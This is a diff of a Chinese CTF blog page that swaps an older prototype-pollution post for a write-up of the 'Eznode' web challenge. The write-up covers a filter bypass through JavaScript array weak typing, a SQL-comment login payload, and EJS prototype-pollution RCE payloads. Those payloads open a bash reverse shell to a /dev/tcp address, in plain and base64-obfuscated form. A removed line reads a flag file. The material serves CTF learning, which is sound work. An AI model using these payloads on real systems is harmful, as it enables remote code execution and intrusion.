@@ -18,7 +18,7 @@
   <meta name="author" content="KKfine&#39;s blog">
   <meta name="keywords" content="">
   
-  <title>绿城杯 - KKfine&#39;s blog</title>
+  <title>GKcctf - KKfine&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -158,12 +158,12 @@
 </nav>
 
     <div class="banner" id="banner" parallax=true
-         style="background: url('/img/3.jpg') no-repeat center center;
+         style="background: url('/img/2.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="绿城杯">
+            <span class="h2" id="subtitle" title="GKcctf">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-30 11:46" pubdate>
-        2021年10月30日 中午
+      <time datetime="2021-11-01 12:46" pubdate>
+        2021年11月1日 下午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      113 字
+      816 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      2
+      11
        分钟
     </span>
   
@@ -225,12 +225,39 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">绿城杯</h1>
+            <h1 style="display: none">GKcctf</h1>
             
             <div class="markdown-body">
-              <h1 id="Looking-for-treasure"><a href="#Looking-for-treasure" class="headerlink" title="Looking for treasure"></a>Looking for treasure</h1><p>json-schema原型链</p>
-<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">POST /validated/json-schema/validate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br>&#123;&quot;$schema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;outputFunctionName&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x&quot;&#125;,&quot;path&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure>
+              <h1 id="Eznode"><a href="#Eznode" class="headerlink" title="Eznode"></a>Eznode</h1><p>考点为js弱类型比较，ejs原型链污染rce</p>
+<p>原理参考ejs原型链污染rce</p>
+<p><a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/">https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/</a></p>
+<p>审计源码发现存在</p>
+<p>一个<code>login</code>登录并且有白名单过滤，</p>
+<p>登录后存在token认证</p>
+<p>可以在<code>/addAdmin</code>下添加admin账户</p>
+<p>最后可以在不知道在干啥的<code>adminDIV</code>路由发现原型链污染漏洞，这里的<code>extend</code>方法会将第二个参数<code>JSON.parse(addDIV)</code>压入到第一个参数中，这里还特别用了<code>JSON.parse</code>防止了<code>__proto__</code>被当作原型。</p>
+<p><img src="https://img-blog.csdnimg.cn/977632bb08cc424bb003e551981d48be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>本地测试了一下</p>
+<p><img src="https://img-blog.csdnimg.cn/26570674c40e4f12a198de84f9d7218a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>第二个漏洞点在于<code>ejs</code>的模板引擎rce，需要借助第一步的原型链污染实现</p>
+<p><code>&#123;&#39;__proto__&#39;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.16.163.238 /2333 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p>
+<p>但是要进入<code>adminDIV</code>需要进行登录，登录中需要绕过白名单，这个考的是js弱类型，数组真的是在任何题目都可能考到的东西，虽然这个点不大，但以后一定要经常记起来这个东西，不然就会卡半天。这里过滤的逻辑是</p>
+<p>在白名单<code>blacklist = [&#39;\\&#39;,&#39;\^&#39;,&#39;)&#39;,&#39;(&#39;,&#39;\&quot;&#39;,&#39;\&#39;&#39;]</code>中遍历，当用户输入中有白名单中的字符则让这个字符变成<code>*</code>。</p>
+<p>这里可以想如果我们输入的参数为一个数组，那么<code>str[i]</code>就是一个字符，则<code>if (waf(str[i]) ==&quot;*&quot;)</code>肯定为false，从而绕过，但是这样进行sql查询时，数组没有substr方法会报错，可以看到if里面还有个拼接操作，在js中数组加上字符串最后结果是一个字符串，所以仍然需要进入if语句中，所以这里的思路就是构造一个数组但是数组里面会含有白名单中的字符。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> waf = <span class="hljs-function">(<span class="hljs-params">str</span>)=&gt;</span>&#123;<br>       blacklist = [<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>]<br>       blacklist.forEach(<span class="hljs-function"><span class="hljs-params">element</span> =&gt;</span> &#123;<br>           <span class="hljs-keyword">if</span> (str == element)&#123;<br>               str = <span class="hljs-string">&quot;*&quot;</span>;<br>           &#125;<br>       &#125;);<br>       <span class="hljs-keyword">return</span> str;<br>   &#125;<br><br>   <span class="hljs-keyword">const</span> safeStr = <span class="hljs-function">(<span class="hljs-params">str</span>)=&gt;</span>&#123; <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;i &lt; str.length;i++)&#123;<br>       <span class="hljs-keyword">if</span> (waf(str[i]) ==<span class="hljs-string">&quot;*&quot;</span>)&#123;<br>           <br>           str =  str.slice(<span class="hljs-number">0</span>, i) + <span class="hljs-string">&quot;*&quot;</span> + str.slice(i + <span class="hljs-number">1</span>, str.length);<br>       &#125;<br>       <br>   &#125;<br></code></pre></div></td></tr></table></figure>
 
+<p>构造payload，这里username长度得足够因为后面还有substr方法</p>
+<p><code>username[]=admin&#39;#&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=(&amp;password=123456    </code></p>
+<p>这样最后结果就是</p>
+<p><img src="https://img-blog.csdnimg.cn/441ad71931b54ccea4d23a414367b0b2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>改包发送得到token</p>
+<p><img src="https://img-blog.csdnimg.cn/8cf203044c9a4c2cbb17df42d85c0a4d.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>用得到的token添加admin用户，注意让添加的用户名为<code>__proto__</code>，然后用添加成功的admin用户登录然后进行原型污染。用新用户登录中直接登录就不行，非得用hackbar，真不知道为啥。</p>
+<p><img src="https://img-blog.csdnimg.cn/dc3867f9e44d49818444c4a2481d99fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>拿到新用户token后进行原型链污染，然后访问admin页面进入 ejs 渲染引擎getshell，buu内网靶机监听。</p>
+<p><code>data=&#123;&#39;__proto__&#39;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNi4xNjMuMjM4LzIzMzMgMD4mMQo= | base64 -d | bash&#39;);var __tmp2&quot;&#125;&#125;</code></p>
 
             </div>
             <hr>
@@ -248,9 +275,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
-                    
                       <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                     
                   </div>
                 
@@ -267,9 +294,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/01/%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/">
+                      <a href="/2021/11/04/2021-11-%E4%B8%9C%E5%8D%8E%E6%9D%AF/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">字节跳动</span>
+                        <span class="hidden-mobile">东华杯</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -277,8 +304,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/10/2021-10-%E5%A4%A9%E7%BF%BC%E6%9D%AF%E5%A4%8D%E7%8E%B0/">
-                        <span class="hidden-mobile">天翼杯复现</span>
+                      <a href="/2021/11/01/2021-10-%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/">
+                        <span class="hidden-mobile">字节跳动</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
